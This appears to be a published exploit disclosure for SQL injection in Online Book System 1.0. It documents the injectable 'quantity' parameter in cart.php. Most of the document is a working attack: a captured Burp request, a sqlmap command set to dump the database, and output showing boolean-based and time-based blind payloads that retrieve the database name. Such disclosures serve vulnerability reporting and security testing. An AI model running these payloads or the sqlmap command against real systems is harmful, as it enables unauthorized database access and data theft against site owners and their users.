# Online Book System- SQL Injection - 5
+ **Exploit Title:** Online Book System- SQL Injection
+ **Date:** 2024-26-03
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://code-projects.org/online-book-system-in-php-css-js-and-mysql-free-download/
+ **Software Link:** https://download.code-projects.org/details/74c24d93-431e-4e31-acc1-802f14caef5c
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
Online Book System 1.0 allows SQL Injection via the 'quantity' parameter at "/BookStore-master%201/cart.php?ID=ENT-1&quantity=1". 
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "localhost/BookStore-master 1/index.php"
+ Then select a book and press buy
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:

```
GET /BookStore-master%201/cart.php?ID=ENT-1&quantity=1 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
```

+ Use sqlmap to exploit. In sqlmap, use 'quantity' parameter to dump the database.
```
sqlmap -r r.txt -p quantity --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: quantity (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: ID=ENT-1&quantity=1 AND 4858=(SELECT (CASE WHEN (4858=4858) THEN 4858 ELSE (SELECT 6833 UNION SELECT 6685) END))-- -

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: ID=ENT-1&quantity=1 AND (SELECT 7172 FROM (SELECT(SLEEP(5)))hoIs)
---
[11:33:46] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[11:33:46] [INFO] fetching current database
[11:33:46] [INFO] retrieving the length of query output
[11:33:46] [INFO] retrieved: 16
[11:33:48] [INFO] retrieved: u385439067_store             
current database: 'u385439067_store'

```
+ current database: `u385439067_store`

![Ekran görüntüsü 2024-03-26 183630](https://github.com/BurakSevben/CVEs/assets/117217689/3e6e3edd-ba5e-43db-8405-74e1539c63df)

